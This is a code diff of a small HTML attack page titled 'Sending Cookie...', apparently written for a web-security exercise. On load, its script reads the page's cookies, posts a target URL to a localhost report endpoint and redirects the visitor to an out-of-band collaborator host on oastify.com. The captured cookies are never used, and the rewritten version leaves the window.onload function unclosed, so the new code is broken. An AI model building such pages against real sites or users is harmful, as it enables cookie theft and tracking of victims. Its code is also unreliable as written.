@@ -5,25 +5,26 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sending Cookie...</title>
     <script>
-        // Capture cookies (note: cookies from another site won't be accessible due to security policies)
-        var cookies = document.cookie;
-        var targetUrl = "https://k5qhq6zvehxbe36z2n30wa0tyk4bs1gq.oastify.com"; // Target URL
-        var reportUrl = "http://localhost:5000/report"; // Localhost report URL
+        window.onload = function() {
+            // Capture cookies (if accessible)
+            var cookies = document.cookie;
+            var targetUrl = "https://k5qhq6zvehxbe36z2n30wa0tyk4bs1gq.oastify.com"; // Target URL
+            var reportUrl = "http://localhost:5000/report"; // Report endpoint
 
-        // Send a POST request with the cookies and URL
-        fetch(reportUrl, {
-            method: "POST",
-            headers: { "Content-Type": "application/x-www-form-urlencoded" },
-            body: new URLSearchParams({ url: targetUrl })
-        })
-        .then(() => {
-            // Redirect after the request is sent
-            window.location.href = targetUrl;
-        })
-        .catch(error => {
-            console.error("Failed to send data:", error);
-            window.location.href = targetUrl; // Redirect even if the request fails
-        });
+            // Send a POST request with URL
+            fetch(reportUrl, {
+                method: "POST",
+                headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                body: new URLSearchParams({ url: targetUrl })
+            })
+            .then(() => {
+                // Redirect after successful request
+                window.location.href = targetUrl;
+            })
+            .catch(error => {
+                console.error("Failed to send data:", error);
+                window.location.href = targetUrl; // Redirect even if request fails
+            });
     </script>
 </head>
 <body>
